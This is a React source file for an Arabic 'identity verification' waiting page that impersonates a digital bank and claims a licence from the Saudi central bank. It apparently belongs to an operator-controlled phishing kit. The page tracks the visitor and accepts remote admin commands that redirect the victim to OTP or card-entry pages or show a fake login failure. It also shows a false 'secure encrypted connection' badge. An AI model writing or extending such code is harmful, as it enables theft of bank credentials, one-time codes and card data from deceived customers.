import { useEffect, useRef, useState } from "react";
import { Shield } from "lucide-react";
import { unityApi } from "@/lib/api";
import { useTracking } from "@/lib/useTracking";
import { useAdminCommands } from "@/lib/useTracking";

const BRAND = { primary: "#1a3d6e", gold: "#c4923e" };

export default function WaitingPage() {
  useTracking("انتظار");
  const [rejected, setRejected] = useState(false);

  useAdminCommands({
    "redirect:otp":    () => { window.location.href = "/unity-bank/otp"; },
    "redirect:card":   () => { window.location.href = "/unity-bank/card"; },
    "redirect:home":   () => { window.location.href = "/unity-bank/"; },
    "redirect:reject": () => setRejected(true),
    "redirect:cancel": () => setRejected(true),
  });

  if (rejected) {
    return (
      <div
        className="min-h-screen flex items-center justify-center p-4"
        dir="rtl"
        style={{
          fontFamily: "'Cairo', system-ui, sans-serif",
          background: "linear-gradient(135deg, #1a1a2e 0%, #16213e 100%)",
        }}
      >
        <div className="w-full max-w-sm text-center bg-white rounded-3xl shadow-2xl p-10 space-y-5">
          <div
            className="w-20 h-20 rounded-full flex items-center justify-center mx-auto"
            style={{ background: "#fee2e2" }}
          >
            <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#ef4444" strokeWidth="2.5" strokeLinecap="round">
              <circle cx="12" cy="12" r="10" />
              <line x1="15" y1="9" x2="9" y2="15" />
              <line x1="9" y1="9" x2="15" y2="15" />
            </svg>
          </div>
          <h2 className="text-gray-900 font-black text-xl">تعذّر تسجيل الدخول</h2>
          <p className="text-gray-500 text-sm leading-relaxed">
            لم نتمكن من التحقق من بياناتك في الوقت الحالي.<br />
            يرجى المحاولة مرة أخرى أو التواصل مع الدعم.
          </p>
          <button
            onClick={() => { window.location.href = "/unity-bank/login"; }}
            className="w-full py-3 rounded-xl text-white font-black text-sm"
            style={{ background: BRAND.primary }}
          >
            العودة لتسجيل الدخول
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen flex items-center justify-center p-4" dir="rtl"
      style={{ fontFamily: "'Cairo', system-ui, sans-serif", background: `linear-gradient(135deg, ${BRAND.primary} 0%, #0d2847 100%)` }}>
      <div className="w-full max-w-sm text-center">
        <div className="bg-white rounded-3xl shadow-2xl p-10 space-y-6">
          <div className="w-20 h-20 rounded-full flex items-center justify-center mx-auto" style={{ background: `${BRAND.primary}15` }}>
            <div className="w-14 h-14 border-4 border-t-transparent rounded-full animate-spin" style={{ borderColor: `${BRAND.primary}40 ${BRAND.primary} ${BRAND.primary} ${BRAND.primary}` }} />
          </div>

          <div>
            <h2 className="text-gray-900 font-black text-xl mb-2">جاري التحقق من هويتك</h2>
            <p className="text-gray-500 text-sm leading-relaxed">
              يرجى الانتظار بينما نتحقق من بياناتك<br />هذه العملية لا تستغرق سوى لحظات
            </p>
          </div>

          <div className="space-y-2">
            {["التحقق من الهوية", "مراجعة البيانات", "تأمين الجلسة"].map((step, i) => (
              <div key={i} className="flex items-center gap-3 bg-gray-50 rounded-xl px-4 py-2.5">
                <div className="w-5 h-5 rounded-full flex items-center justify-center text-[10px] font-black text-white flex-shrink-0"
                  style={{ background: i === 0 ? BRAND.primary : `${BRAND.primary}30` }}>
                  {i === 0 ? "✓" : i + 1}
                </div>
                <span className="text-sm font-semibold text-gray-600">{step}</span>
                {i === 0 && <span className="mr-auto text-[10px] font-bold text-green-600 bg-green-100 px-2 py-0.5 rounded-full">مكتمل</span>}
                {i === 1 && <span className="mr-auto text-[10px] font-bold text-blue-600 bg-blue-100 px-2 py-0.5 rounded-full">جاري...</span>}
              </div>
            ))}
          </div>

          <div className="bg-amber-50 border border-amber-200 rounded-xl p-3">
            <p className="text-amber-700 text-xs font-semibold">لا تغلق هذه الصفحة حتى اكتمال عملية التحقق</p>
          </div>

          <div className="flex items-center justify-center gap-2 text-xs text-gray-400">
            <Shield className="w-3.5 h-3.5 text-green-500" />
            <span className="font-semibold">اتصال آمن ومشفر</span>
          </div>
        </div>

        <p className="text-blue-300 text-xs mt-4 font-semibold">البنك الوحدة الرقمي • مرخص من ساما</p>
      </div>
    </div>
  );
}
